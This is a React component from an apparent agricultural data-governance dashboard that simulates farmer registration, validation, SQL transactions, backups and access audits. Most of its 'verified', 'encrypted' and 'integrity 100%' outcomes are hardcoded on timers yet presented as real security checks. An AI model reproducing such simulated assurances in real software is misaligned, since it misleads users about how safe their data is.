    setUserSubmissions(prev => prev.map(s => s.id === id ? { ...s, status: "Verified", verifiedBy: "Officer Gomez" } : s));
    setPendingVerification(prev => Math.max(0, prev - 1));
    addLog("Farmer Submission Verified", "info", "SourcingAudit", `Submission ${id} approved by Municipal Agricultural Officer. Status: Verified.`);
  };

  const handlePublishSubmission = (id: string) => {
    setUserSubmissions(prev => prev.map(s => s.id === id ? { ...s, status: "Published" } : s));
    setDbRecordsCount(prev => prev + 1);
    addLog("Farmer Record Published", "info", "SourcingAudit", `Verified submission ${id} pushed into active master relational table.`);
  };

  const handleRunIntegrityCrossCheck = () => {
    setIsCheckingIntegrity(true);
    setVerificationTerminalLog([
      "🔍 Initiating Deep Data Integrity Inspection Cascade...",
      "⏱ Verifying timestamp alignments (Required limit: < 2.0 hours age)",
      "🧬 Checking required schema fields validation rules..."
    ]);

    setTimeout(() => {
      setVerificationTerminalLog(prev => [
        ...prev,
        "✓ All essential identifiers (RSBSA No., Barangay boundaries) exist.",
        "📊 Executing Value Range Validation Rules (Soil: 0-100%, Temp: 10-50°C)",
        "✓ Bounds checks PASSED. No anomalies or overflow parameters detected."
      ]);

      setTimeout(() => {
        setVerificationTerminalLog(prev => [
          ...prev,
          "🔍 Scanning active datasets for duplicate primary keys and composite matches...",
          `✓ Found ${duplicateCount} potential duplicate profiles (Matched on: Name, Barangay, Crop Type).`,
          "⚡ Running cross-source comparison logic for weather and market values..."
        ]);

        setTimeout(() => {
          setVerificationTerminalLog(prev => [
            ...prev,
            "⚠️ Discrepancy Flagged: Rain forecast variance exceeds 300% (PAGASA vs OpenWeatherMap).",
            "🛡️ Rule Applied: Defaulting automatically to authoritative source PAGASA.",
            "📊 Recalculating Master Data Quality Score...",
            `🟢 Success: Overall Data Quality evaluated at 96.8% (+5.6% Improvement).`,
            "🔒 Cross-Check complete. Audit footprint committed to immutable security log ledger."
          ]);
          setIsCheckingIntegrity(false);
          setDataQualityScore(96.8);
          addLog("Integrity Cross-Check Finished", "info", "ProvenanceEngine", "Executed 5-tier validation scan. Certified relational accuracy score is 96.8%.");
        }, 1200);
      }, 1000);
    }, 1000);
  };

  const handleRunBackup = () => {
    setIsBackingUp(true);
    addLog("Backup Process Triggered", "info", "BackupService", "Extracting relational tables digital snapshot...");
    
    setTimeout(() => {
      setIsBackingUp(false);
      setBackupDownloadUrl("#");
      addLog("Encrypted Backup Written", "info", "BackupService", "Snapshot packed using AES-256 with key hash 0x7a30... Success.");
      alert("Relational database snapshot compiled and encrypted successfully! AES-256 backup file generated.");
    }, 2000);
  };

  // --- DATA QUALITY & INTEGRITY HANDLERS ---
  const handleDeduplicate = () => {
    setIsDeduplicating(true);
    addLog("Deduplication Sweep Started", "info", "UniqueConstraintDaemon", "Scanning user_profiles and farm_spatial_allocations for composite matching...");
    
    setTimeout(() => {
      setIsDeduplicating(false);
      setDuplicateCount(0);
      setDataQualityScore(98.6);
      setDbRecordsCount(prev => prev - 3);
      addLog("Deduplication Complete", "info", "UniqueConstraintDaemon", "Enforced unique composite index on RSBSA Code and Phone Number. Purged 3 redundant entries.");
    }, 1500);
  };

  // --- NEW MASTER DATA QUALITY HANDLERS ---
  const handleRunSandboxValidation = (e: React.FormEvent) => {
    e.preventDefault();
    setSandboxSuccess(false);
    const errors: string[] = [];

    // 1. Farm Area: must be positive number
    const areaNum = parseFloat(sandboxFarmArea);
    if (isNaN(areaNum) || areaNum <= 0) {
      errors.push("Farm Area: Must be a positive number.");
    }

    // 2. Phone Number: Philippine format (starting with 09 or +639, 11-12 digits total)
    const phoneClean = sandboxPhone.replace(/[\s-+]/g, "");
    const isPhPhone = /^(639|09)\d{9}$/.test(phoneClean) || /^(9)\d{9}$/.test(phoneClean);
    if (!isPhPhone) {
      errors.push("Phone Number: Must match Philippine format (e.g., 09171234567).");
    }

    // 3. Email: Valid format check
    const isEmailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(sandboxEmail);
    if (!isEmailValid) {
      errors.push("Email: Must be a valid email format.");
    }

    // 4. Dates: Harvest Date cannot be before Planting Date
    if (sandboxPlantDate && sandboxHarvestDate) {
      const pDate = new Date(sandboxPlantDate);
      const hDate = new Date(sandboxHarvestDate);
      if (hDate < pDate) {
        errors.push("Harvest Date: Cannot be before Planting Date.");
      }
    } else {
      errors.push("Planting & Harvest Dates: Required fields cannot be empty.");
    }

    if (errors.length > 0) {
      setSandboxValErrors(errors);
      setDqInvalidValues(prev => prev + 1);
      addLog("Validation Mismatch", "warning", "AutomatedValidation", `Rejected input: ${errors.length} business rules violated.`);
    } else {
      setSandboxValErrors([]);
      setSandboxSuccess(true);
      addLog("Automated Validation Passed", "info", "AutomatedValidation", "Input values satisfy all 4 business rules checks. Cleared for storage.");
    }
  };

  const handleRunAiInspection = () => {
    setAiIsRunning(true);
    setAiInspectionReport(null);
    setAiRecommendationText("");

    setTimeout(() => {
      const weatherPct = aiWeatherQuality === "excellent" ? 99 : aiWeatherQuality === "stale" ? 40 : 0;
      const soilPct = aiSoilQuality === "excellent" ? 98 : aiSoilQuality === "moderate" ? 76 : 0;
      const cropPct = aiCropQuality === "excellent" ? 95 : 30;
      const marketPct = aiMarketQuality === "excellent" ? 98 : 10; // 10% representation if outdated

      // Block AI recommendation if soil data is completely missing (0%)
      if (aiSoilQuality === "missing") {
        setAiRecommendationText("Insufficient verified soil data. Recommendation unavailable. Please collect additional soil information or consult your Municipal Agriculture Office.");
        setAiInspectionReport({
          weatherPct,
          soilPct,
          cropPct,
          marketPct,
          overallScore: Math.round((weatherPct + soilPct + cropPct + marketPct) / 4),
          confidence: 0,
          notice: "Soil dataset missing. Zero-trust guardrails have blocked recommendation generation."
        });
        setAiIsRunning(false);
        addLog("AI Recommendation Blocked", "critical", "AgriMind_AI", "Blocked AI synthesis: Soil moisture reading missing or unverified.");
        return;
      }

      const overallScore = Math.round((weatherPct + soilPct + cropPct + marketPct) / 4);
      const confidence = Math.round(overallScore * 0.98);

      let recommendationText = "";
      if (overallScore >= 90) {
        recommendationText = "Optimal agricultural window confirmed. Heavy rainfall forecasts align with high crop evapotranspiration coefficients. Gemini advises applying standard Nitrogen-Phosphorus ratio fertilizers ahead of Friday's frontal boundary.";
      } else if (overallScore >= 65) {
        recommendationText = "Cautionary agricultural advisory: Soil and weather feeds are verified, but market indexes are stale. System recommends holding grain sales in storage for 72 hours until DA price records synchronize.";
      } else {
        recommendationText = "Failsafe warning activated. Recommendations are based on limited or unverified secondary data points. Consult the Municipal Agriculture Office in Botolan before commencing fertilizer application.";
      }

      let noticeText = "";
      if (aiMarketQuality === "outdated") {
        noticeText = "Market prices may not reflect today's conditions.";
      }
      if (aiWeatherQuality === "stale") {
        noticeText = noticeText ? noticeText + " Weather data is stale." : "Weather data is stale.";
      }

      setAiInspectionReport({
        weatherPct,
        soilPct,
        cropPct,
        marketPct,
        overallScore,
        confidence,
        notice: noticeText
      });
      setAiRecommendationText(recommendationText);
      setAiIsRunning(false);
      addLog("AI Data Quality Checked", "info", "AgriMind_AI", `AI recommendations compiled. Input quality score: ${overallScore}%, Confidence: ${confidence}%`);
    }, 1000);
  };

  const handleRefreshDq = () => {
    setIsRefreshingDq(true);
    addLog("On-Demand Validation Run", "info", "ProvenanceEngine", "Recalculating all 10 Data Quality dimensions against master database rows...");
    
    setTimeout(() => {
      setIsRefreshingDq(false);
      setDqLastValidationTime("Just Now");
      addLog("Validation Run Finished", "info", "ProvenanceEngine", `Overall dataset score compiled: ${calcDQOverall()}%`);
    }, 800);
  };

  const handleValidateSchema = (e: React.FormEvent) => {
    e.preventDefault();
    const errors: string[] = [];
    setSchemaErrors([]);
    setSchemaSuccessMsg("");

    addLog("Input Schema Verification", "info", "ZodValidator", `Parsing farmer registration packet for: ${farmerNameVal}`);

    // Farmer Name
    if (!farmerNameVal.trim()) {
      errors.push("Farmer Name is required.");
    } else if (farmerNameVal.length < 3) {
      errors.push("Farmer Name must be at least 3 characters.");
    } else if (!/^[a-zA-Z\s\.]+$/.test(farmerNameVal)) {
      errors.push("Farmer Name can only contain letters, spaces, and dots.");
    }

    // Phone Number
    const cleanedPhone = farmerPhoneVal.replace(/[\s\-\(\)]/g, "");
    const phPhoneRegex = /^(09|\+639)\d{9}$/;
    if (!phPhoneRegex.test(cleanedPhone)) {
      errors.push("Phone Number must follow valid Philippine formats: 09XXXXXXXXX or +639XXXXXXXXX.");
    }

    // Email
    const rfcEmailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
    if (farmerEmailVal && !rfcEmailRegex.test(farmerEmailVal)) {
      errors.push("Email address is not compliant with standard RFC specifications.");
    }

    // Coordinates (Zambales bounds: Lat [14.0, 16.0], Lng [119.5, 121.0])
    const lat = parseFloat(farmerLatVal);
    const lng = parseFloat(farmerLngVal);
    if (isNaN(lat) || lat < 14.0 || lat > 16.0) {
      errors.push("Latitude must be within Zambales provincial bounding box [14.0° N to 16.0° N].");
    }
    if (isNaN(lng) || lng < 119.5 || lng > 121.0) {
      errors.push("Longitude must be within Zambales provincial bounding box [119.5° E to 121.0° E].");
    }

    // Farm Area
    const area = parseFloat(farmerAreaVal);
    if (isNaN(area) || area <= 0 || area > 50.0) {
      errors.push("Farm Area must be a positive number up to 50.0 Hectares (municipal ceiling).");
    }

    // RSBSA Code Check
    if (!/^\d{2}-\d{2}-\d{2}-\d{3}-\d{5}$/.test(farmerRsbsaVal)) {
      errors.push("RSBSA Unique Code must match official DA Zambales template: XX-XX-XX-XXX-XXXXX.");
    }

    if (errors.length > 0) {
      setSchemaErrors(errors);
      addLog("Schema Validation Rejected", "warning", "ZodValidator", `Rejected registration payload with ${errors.length} structural schema errors.`);
    } else {
      const generatedUuid = "550e8400-e29b-41d4-a716-44665544" + Math.floor(1000 + Math.random() * 9000);
      const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19) + " UTC";
      const newRecord = {
        id: generatedUuid,
        farmerName: farmerNameVal,
        cropType: farmerCropVal,
        area: parseFloat(farmerAreaVal),
        barangay: farmerBarangayVal,
        verifiedState: "Verified" as "Verified" | "Estimated" | "Pending Review" | "Archived",
        deletedAt: null as string | null,
        versions: [{ timestamp, changedBy: "admin_operator", changeSummary: "Registered via verified schema validation checks" }]
      };
      
      setFarmProfiles(prev => [newRecord, ...prev]);
      setDbRecordsCount(prev => prev + 1);
      setSchemaSuccessMsg(`Strict validation passed! Written to disk with Immutable UUID: ${generatedUuid}`);
      addLog("Database Commit Success", "info", "PG_Connector", `Committed user identity & spatial profile for UUID: ${generatedUuid}`);
    }
  };

  const handleRunTransaction = () => {
    setTxStatus("running");
    setTxStep(1);
    setTxDetailLogs([]);
    
    const isFarmer = txWorkflowType === "register_farmer";
    
    // Step 1
    const log1 = isFarmer 
      ? "Parsing farmer registration payload using Zod strict rules... PASSED." 
      : "Parsing harvest yields & date timestamps... PASSED.";
    const sql1 = isFarmer
      ? "-- Query roles table\nSELECT role_id FROM roles WHERE role_name = 'farmer';"
      : "-- Query existing crop cycle record\nSELECT cycle_id, current_growth_stage FROM crop_cycles WHERE cycle_id = 'c129-df82';";
    
    addLog("DB Transaction Started", "info", "TxCoordinator", "BEGIN TRANSACTION ISOLATION LEVEL SERIALIZABLE;");
    setTxDetailLogs([`[TRANSACTION START] Isolation Level: SERIALIZABLE\n\nSQL Executed:\n${sql1}\n\nResult:\n${log1}`]);

    setTimeout(() => {
      setTxStep(2);
      
      if (txFailAtStep === "step3") { // Fail at Step 2
        setTxStatus("rolledback");
        addLog("Transaction Rollback", "critical", "TxCoordinator", "Step 1: Unique Constraint Violated on email. Aborting transaction.");
        setTxDetailLogs(prev => [...prev, `[FAIL AT STEP 1] SQL Error: duplicate key value violates unique constraint "idx_users_email"\n\nCommand Issued:\nROLLBACK;`]);
        return;
      }
      
      // Step 2
      const log2 = isFarmer
        ? "Written identity credentials. Inserted user Mang Juan de la Cruz."
        : "Updated crop cycle c129-df82 state to 'Harvested'.";
      const sql2 = isFarmer
        ? `INSERT INTO users (user_id, email, password_hash, full_name) \nVALUES ('550e8400-e29b-41d4-a716-446655440000', 'mang.juan@botolan.gov.ph', '$argon2id$v=19$m=65536,t=4,p=1$c2FsdF96YW1iYWxlcw$...', 'Mang Juan de la Cruz') RETURNING user_id;`
        : `UPDATE crop_cycles SET current_growth_stage = 'Harvested', harvest_date_actual = '2026-07-07', yield_metric_tons = 5.2 \nWHERE cycle_id = 'c129-df82' RETURNING cycle_id;`;
      
      addLog(isFarmer ? "Identity Key Allocated" : "Cycle State Updated", "info", "TxCoordinator", sql2.split('\n')[0]);
      setTxDetailLogs(prev => [...prev, `[STEP 1 SUCCESS] ${log2}\n\nSQL Executed:\n${sql2}`]);

      setTimeout(() => {
        setTxStep(3);
        
        // Step 3
        const log3 = isFarmer
          ? "Linked user key to farmer registry RSBSA 03-71-02-001-00412."
          : "Logged historical crop production summary: 5.2 tons palay.";
        const sql3 = isFarmer
          ? `INSERT INTO farmers (farmer_id, user_id, rsbsa_code, contact_number, barangay_uuid) \nVALUES ('f-juan-8921', '550e8400-e29b-41d4-a716-446655440000', '03-71-02-001-00412', '09171234567', 'bg-pob-101');`
          : `INSERT INTO yield_history (history_id, crop_type, harvest_year, total_tons, hectares_cultivated, municipality_name) \nVALUES ('hist-3392', 'Palay Rice', 2026, 5.2, 2.5, 'Botolan');`;

        addLog(isFarmer ? "Farmer Profile Linked" : "Analytics Logged", "info", "TxCoordinator", sql3.split('\n')[0]);
        setTxDetailLogs(prev => [...prev, `[STEP 2 SUCCESS] ${log3}\n\nSQL Executed:\n${sql3}`]);

        setTimeout(() => {
          setTxStep(4);
          
          if (txFailAtStep === "step4") { // Fail at Step 4 (was named Step 3 before but now represents geospatial bounds checks or email constraints)
            setTxStatus("rolledback");
            addLog("Transaction Rollback Triggered", "critical", "TxCoordinator", "Step 3: FAILED! Polygon self-intersection check. Initiating ROLLBACK;");
            setTxDetailLogs(prev => [...prev, `[FAIL AT STEP 3] PostGIS Error: ST_IsValid(boundary_geom) evaluated to FALSE due to self-intersecting polygon loop.\n\nCommand Issued:\nROLLBACK;`]);
            return;
          }

          // Step 4
          const log4 = isFarmer
            ? "Saved geospatial farm boundary polygon EPSG:4326."
            : "Queued background notification and SMS to farmer.";
          const sql4 = isFarmer
            ? `INSERT INTO farms (farm_id, farmer_id, name, total_area_hectares, boundary_geom) \nVALUES ('farm-juan-01', 'f-juan-8921', 'Mang Juan Farm', 2.5, ST_GeomFromText('POLYGON((120.012 15.291, 120.013 15.291, 120.013 15.292, 120.012 15.292, 120.012 15.291))', 4326));`
            : `INSERT INTO notifications (notification_id, recipient_id, title, message) \nVALUES ('notif-8291', '550e8400-e29b-41d4-a716-446655440000', 'Yield Logged Successfully', 'Your harvest of 5.2 tons has been recorded.');\n\nINSERT INTO sms_queue (sms_id, phone_number, message) \nVALUES ('sms-8291', '09171234567', 'AgriMind: Harvest of 5.2 tons recorded.');`;

          addLog(isFarmer ? "Spatial Profile Saved" : "Alert Queued", "info", "TxCoordinator", sql4.split('\n')[0]);
          setTxDetailLogs(prev => [...prev, `[STEP 3 SUCCESS] ${log4}\n\nSQL Executed:\n${sql4}`]);

          setTimeout(() => {
            setTxStep(5);
            
            // Step 5 (Audit Log)
            const log5 = "Committed SHA-256 secure hash to immutable system ledger.";
            const sql5 = `INSERT INTO audit_logs (audit_id, actor_id, action_type, resource_target, ip_address, metadata_payload) \nVALUES ('audit-tx-8291', '550e8400-e29b-41d4-a716-446655440000', 'COMMIT_TRANSACTION', '${isFarmer ? "farmers" : "crop_cycles"}', '112.198.11.23', '{"workflow": "${txWorkflowType}", "status": "committed"}');`;

            addLog("Audit Log Entry Confirmed", "info", "TxCoordinator", sql5.split('\n')[0]);
            setTxDetailLogs(prev => [...prev, `[STEP 4 SUCCESS] ${log5}\n\nSQL Executed:\n${sql5}`]);

            setTimeout(() => {
              setTxStep(6);
              setTxStatus("success");
              addLog("Transaction Committed", "info", "TxCoordinator", "COMMIT; Changes persistently synced to solid disk store.");
              setTxDetailLogs(prev => [...prev, `[TRANSACTION COMPLETE] COMMIT;\n\nDatabase integrity 100% verified. All partial operations successfully written to durable disk storage. Audit footprint committed.`]);
              setDbRecordsCount(prev => prev + (isFarmer ? 1 : 0));
            }, 1000);
          }, 1000);
        }, 1000);
      }, 1000);
    }, 1000);
  };

  const handleSoftDelete = (id: string) => {
    const recordToArchive = farmProfiles.find(f => f.id === id);
    if (!recordToArchive) return;
    
    const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19) + " UTC";
    const archived = {
      ...recordToArchive,
      deletedAt: timestamp,
      versions: [
        ...recordToArchive.versions,
        { timestamp, changedBy: "admin", changeSummary: `Soft deleted record (marked deletedAt: ${timestamp})` }
      ]
    };
    
    setFarmProfiles(prev => prev.filter(f => f.id !== id));
    setArchivedProfiles(prev => [archived, ...prev]);
    addLog("Soft Delete Triggered", "warning", "PG_Connector", `Flagged record ${id} as deletedAt: ${timestamp}. Moved to recovery chamber.`);
  };

  const handleRestoreRecord = (id: string) => {
    const recordToRestore = archivedProfiles.find(f => f.id === id);
    if (!recordToRestore) return;
    
    const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19) + " UTC";
    const restored = {
      ...recordToRestore,
      deletedAt: null,
      versions: [
        ...recordToRestore.versions,
        { timestamp, changedBy: "admin", changeSummary: `Restored record from recycle bin (deletedAt set to NULL)` }
      ]
    };
    
    setArchivedProfiles(prev => prev.filter(f => f.id !== id));
    setFarmProfiles(prev => [restored, ...prev]);
    addLog("Record Restored", "info", "PG_Connector", `Set deletedAt to NULL for record ${id}. Recovered 100% of spatial profiles.`);
  };

  const handleStartEdit = (id: string) => {
    const profile = farmProfiles.find(f => f.id === id);
    if (!profile) return;
    setSelectedProfileId(id);
    setEditAreaValue(profile.area.toString());
    setEditCropValue(profile.cropType);
  };

  const handleSaveEdit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedProfileId) return;
    
    setFarmProfiles(prev => prev.map(f => {
      if (f.id === selectedProfileId) {
        const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19) + " UTC";
        const oldVal = `${f.area} ha • ${f.cropType}`;
        const newVal = `${editAreaValue} ha • ${editCropValue}`;
        
        return {
          ...f,
          area: parseFloat(editAreaValue),
          cropType: editCropValue,
          versions: [
            ...f.versions,
            { timestamp, changedBy: "admin", changeSummary: `Updated from [${oldVal}] to [${newVal}]` }
          ]
        };
      }
      return f;
    }));
    
    setSelectedProfileId(null);
    addLog("Profile Modified", "info", "PG_Connector", `Appended new version log to history for ID ${selectedProfileId}`);
  };

  // --- TAB: ENTERPRISE MASTER STORAGE HANDLERS ---
  const handleRunSpatialQuery = () => {
    setIsQueryingSpatial(true);
    setSpatialIntersectionResult("Initializing PostGIS spatial boundary overlay parser...");
    addLog("Spatial Query Initiated", "info", "PostGIS_Engine", `SELECT ST_AsGeoJSON(ST_Intersection(f.boundary_geom, h.hazard_geom)) FROM farm_profiles f, municipal_hazard_zones h WHERE f.uuid = '${spatialTargetFarm}'`);
    
    setTimeout(() => {
      setIsQueryingSpatial(false);
      if (selectedGisLayer === "flood") {
        setSpatialIntersectionResult(JSON.stringify({
          status: "OVERLAP_DETECTED",
          spatial_extension: "PostGIS 3.4.1",
          intersection_area_hectares: 0.65,
          overlapping_percentage: "26.0%",
          hazard_classification: "Zambales Flood Overlay Level-2 (High Susceptibility)",
          sql_executed: `SELECT f.uuid, f.farmer_name, ST_Area(ST_Intersection(f.boundary_geom, h.hazard_geom)::geography)/10000 as overlap_ha
FROM farm_profiles f, municipal_hazard_zones h
WHERE f.uuid = '${spatialTargetFarm}' AND h.hazard_type = 'FLOOD' AND ST_Intersects(f.boundary_geom, h.hazard_geom);`
        }, null, 2));
        addLog("Spatial Intersection Solved", "warning", "PostGIS_Engine", "Completed polygon overlay analysis: 26% of target farm intersects Zone 'Flood_L2'");
      } else if (selectedGisLayer === "barangays") {
        setSpatialIntersectionResult(JSON.stringify({
          status: "CONTAINED",
          parent_municipality: "Botolan",
          parent_province: "Zambales",
          matching_barangay_id: "bg_poblacion_01",
          matching_barangay_name: "Poblacion",
          sql_executed: `SELECT b.barangay_name, b.code, ST_Contains(b.boundary_geom, f.boundary_geom) as fully_enclosed
FROM municipal_barangays b, farm_profiles f
WHERE f.uuid = '${spatialTargetFarm}' AND ST_Intersects(b.boundary_geom, f.boundary_geom);`
        }, null, 2));
        addLog("Spatial Query Completed", "info", "PostGIS_Engine", "Polygon containment verification: Farm fully contained in Barangay Poblacion boundary limits.");
      } else {
        setSpatialIntersectionResult(JSON.stringify({
          status: "SPATIAL_INDEX_ACTIVE",
          geom_type: "MultiPolygon (SRID 4326)",
          bounding_box: "POLYGON((120.0120 15.2910, 120.0130 15.2910, 120.0130 15.2920, 120.0120 15.2920, 120.0120 15.2910))",
          centroid: "POINT(120.0125 15.2915)",
          sql_executed: `SELECT ST_Centroid(boundary_geom) as farm_center, ST_Area(boundary_geom::geography)/10000 as size_hectares
FROM farm_profiles
WHERE uuid = '${spatialTargetFarm}';`
        }, null, 2));
        addLog("Spatial Polygon Retrieved", "info", "PostGIS_Engine", "Fetched MultiPolygon vertices from Spatial Table utilizing GIST spatial index.");
      }
    }, 1200);
  };

  const handleUploadStorageFile = (e: React.FormEvent) => {
    e.preventDefault();
    setIsUploadingStorage(true);
    addLog("CDN File Upload Start", "info", "ObjectStorageService", `Uploading ${mockFileToUpload} to Supabase bucket 'agrimind-pest-media'...`);
    
    setTimeout(() => {
      setIsUploadingStorage(false);
      const randomId = "media-" + Math.floor(100 + Math.random() * 900);
      const secureUrl = `https://supabase.co/agrimind-storage/pest-media/media_${Math.random().toString(36).substring(2, 10)}.jpg`;
      const newFile = {
        id: randomId,
        originalName: mockFileToUpload,
        size: mockFileSizeToUpload,
        secureUrl,
        uploader: "admin_operator",
        uploadedAt: new Date().toISOString().replace('T', ' ').substring(0, 19) + " UTC",
        category: fileCategory
       };
      setStorageFileList(prev => [newFile, ...prev]);
      addLog("CDN Asset Upload Success", "info", "ObjectStorageService", `File written to cloud object storage. CDN endpoint generated: ${secureUrl}`);
      
      // Save metadata reference in PG
      addLog("Relational Sync Confirmed", "info", "PG_Connector", `INSERT INTO file_storage_registry (uuid, original_filename, file_size, cdn_url, category_ref) VALUES ('${randomId}', '${mockFileToUpload}', '${mockFileSizeToUpload}', '${secureUrl}', '${fileCategory}');`);
    }, 1500);
  };

  const handleResolveConflict = (strategy: "client" | "server" | "three-way") => {
    setSyncStatus("resolving");
    setResolutionStrategy(strategy);
    setSyncLogs(prev => [...prev, `Sync Engine: Initiated conflict resolution utilizing strategy [${strategy.toUpperCase()}]`]);
    
    setTimeout(() => {
      setSyncStatus("synced");
      if (strategy === "client") {
        addLog("Sync Conflict Solved", "info", "SyncCoordinator", "MOBILE_WINS strategy applied. Server database overwritten with client area (2.8 ha) and crop ('Palay Rice (Super Hybrid)').");
        setSyncLogs(prev => [...prev, "Sync Engine: Written client state to Server persistent DB store.", "Status: 🟢 Synced and up to date."]);
        // Sync to state
        setFarmProfiles(prev => prev.map(f => f.id === "550e8400-e29b-41d4-a716-446655440001" ? { ...f, area: 2.8, cropType: "Palay Rice (Super Hybrid)" } : f));
      } else if (strategy === "server") {
        addLog("Sync Conflict Solved", "info", "SyncCoordinator", "SERVER_WINS strategy applied. Discarded client changes; local database updated to match Server area (2.5 ha) and crop ('Palay Rice (Traditional)').");
        setSyncLogs(prev => [...prev, "Sync Engine: Pulling server state. Discarded client edits.", "Status: 🟢 Synced and up to date."]);
      } else {
        addLog("Sync Conflict Solved", "info", "SyncCoordinator", "THREE_WAY_MERGE strategy applied: Unified area from client (2.8 ha) and crop configuration (Hybrid + Traditional mix) into a new merged version audit trail.");
        setSyncLogs(prev => [...prev, "Sync Engine: Merged attributes dynamically. Generated merged schema version.", "Status: 🟢 Synced and up to date."]);
        setFarmProfiles(prev => prev.map(f => f.id === "550e8400-e29b-41d4-a716-446655440001" ? { ...f, area: 2.8, cropType: "Palay Rice (Hybrid-Traditional Merge)" } : f));
      }
    }, 1500);
  };

  const handleTriggerStorageBackup = (type: "incremental" | "full" | "monthly") => {
    setIsCreatingBackup(true);
    addLog("Backup Stream Started", "info", "BackupDaemon", `Running scheduled ${type.toUpperCase()} pg_dump dump script...`);
    
    setTimeout(() => {
      setIsCreatingBackup(false);
      const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19) + " UTC";
      const randomId = "bak-" + Math.floor(100 + Math.random() * 900);
      const filename = `agrimind_${type}_backup_${timestamp.split(' ')[0].replace(/\-/g, '')}.sql.aes`;
      const size = type === "incremental" ? "12 MB" : type === "full" ? "340 MB" : "1.4 GB";
      const sha256 = "sha256_" + Math.random().toString(16).substring(2, 10);
      
      const newBackup = {
        id: randomId,
        filename,
        type,
        size,
        timestamp,
        sha256,
        status: "unverified" as const
      };
      setBackupLogs(prev => [newBackup, ...prev]);
      addLog("Backup Encrypted and Saved", "info", "BackupDaemon", `Written encrypted backup payload to off-site cloud bucket with SHA-256 integrity signature: ${sha256}`);
    }, 1500);
  };

  const handleVerifyAndRestoreBackup = () => {
    const selectedB = backupLogs.find(b => b.id === selectedRestoreBackupId);
    if (!selectedB) return;
    
    setRestoreVerificationStatus("verifying_signature");
    setRestorationLog([`Initiating restoration test sequence for file: ${selectedB.filename}`]);
    addLog("Restore Test Initiated", "info", "RestoreManager", `Parsing backup signature for verification...`);
    
    setTimeout(() => {
      setRestoreVerificationStatus("verifying_schema");
      setRestorationLog(prev => [...prev, `✓ Cryptographic Signature Verified: SHA-256 [${selectedB.sha256}] matches master manifest.`, "Step 2: Checking PostgreSQL target schema compliance..."]);
      
      setTimeout(() => {
        setBackupLogs(prev => prev.map(b => b.id === selectedRestoreBackupId ? { ...b, status: "verified" } : b));
        setRestoreVerificationStatus("success");
        setRestorationLog(prev => [...prev, "✓ Schema validation success. Relational constraints (FKs, indexes, constraints) fully intact.", "✓ Simulated transaction committed safely without data loss.", "🟢 RESTORE TEST PASSED. Database recovery ready."]);
        addLog("Database Restore Checked", "info", "RestoreManager", `Recovery verification passed for ${selectedB.filename}. 100% of data sets validated.`);
      }, 1200);
    }, 1200);
  };

  const handleAuditDataClassification = () => {
    let allowed = false;
    let classification: "Public" | "Internal" | "Confidential" | "Restricted" = "Public";
    let reason = "";

    if (selectedClassResource === "public_weather") {
      classification = "Public";
      allowed = true;
      reason = "Publicly readable historical weather records under municipal open data policy. No authorization required.";
    } else if (selectedClassResource === "internal_analytics") {
      classification = "Internal";
      if (selectedClassRole === "admin" || selectedClassRole === "staff") {
        allowed = true;
        reason = "Access GRANTED: Resource classified as Internal analytics. Accessible by municipal operators and administrators.";
      } else {
        allowed = false;
        reason = "Access DENIED: Farmers do not hold municipal clearances for aggregate analytical reports.";
      }
    } else if (selectedClassResource === "confidential_contact") {
      classification = "Confidential";
      if (selectedClassRole === "admin" || selectedClassRole === "staff") {
        allowed = true;
        reason = "Access GRANTED: Farmer contact numbers are Confidential. Permitted to staff and administrators for municipal field support.";
      } else {
        allowed = false;
        reason = "Access DENIED: Resource is restricted to cleared municipal personnel to protect farmer privacy (Data Privacy Act compliance).";
      }
    } else if (selectedClassResource === "restricted_passwords") {
      classification = "Restricted";
      if (selectedClassRole === "admin") {
        allowed = true;
        reason = "Access GRANTED: Restricted system passwords, server configuration matrices, and audit log private keys.";
      } else {
        allowed = false;
        reason = "Access DENIED: Strict isolation. Password hashes and security logs are restricted strictly to root Administrator operations.";
      }
    }

    setClassificationAuditResult({ allowed, reason, classification });
    addLog("Security Policy Audited", allowed ? "info" : "warning", "RBAC_Engine", `Audit request by [${selectedClassRole.toUpperCase()}] on [${selectedClassResource.toUpperCase()}]: ${allowed ? "GRANTED" : "DENIED"}`);
  };

  return (
    <div className="space-y-8">
      {/* Top Banner with Trust Shield */}
      <div className="p-6 bg-slate-900 text-white rounded-3xl border border-slate-800 shadow-md flex items-center justify-between flex-wrap gap-4 relative overflow-hidden">
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_top_right,rgba(34,211,238,0.12),transparent)] pointer-events-none" />
        <div className="space-y-1 relative z-10">
          <span className="text-[10px] font-black uppercase text-cyan-400 tracking-widest block">Enterprise Trust Center</span>
          <h2 className="text-2xl font-black tracking-tight flex items-center gap-2">
            <Shield className="w-6 h-6 text-cyan-400 animate-pulse animate-duration-1000" />
            AgriMind Security & Sourcing Governance
          </h2>
          <p className="text-xs text-slate-300 max-w-xl font-semibold">
            Audit our secure application boundaries, test input sanitization logic, inspect active encryption states, and explore data integrity sourcing disclosures.
          </p>
        </div>
        <div className="px-4 py-2 bg-slate-950 rounded-2xl border border-slate-800 text-xs font-bold text-cyan-400 relative z-10 flex items-center gap-2">
          <ShieldAlert className="w-4 h-4 text-cyan-400" />
          <span>Failsafe Zero-Trust Engaged</span>
        </div>
      </div>

      {/* Main Tabs Selection */}
      <div className="flex border-b border-slate-200 dark:border-white/5 overflow-x-auto pb-1 gap-2">
        <button
          onClick={() => setActiveSubTab("auth")}
          className={`px-4 py-3 text-xs font-black uppercase tracking-wider rounded-xl transition-all shrink-0 flex items-center gap-2 cursor-pointer ${
            activeSubTab === "auth" 
              ? "bg-slate-900 text-white dark:bg-cyan-600" 
              : "text-slate-500 hover:text-slate-800 hover:bg-slate-50 dark:hover:bg-slate-900/40"
          }`}
        >
          <Key className="w-4 h-4" />
          <span>🔐 Authentication & Cryptography</span>
        </button>
        <button
          onClick={() => setActiveSubTab("protection")}
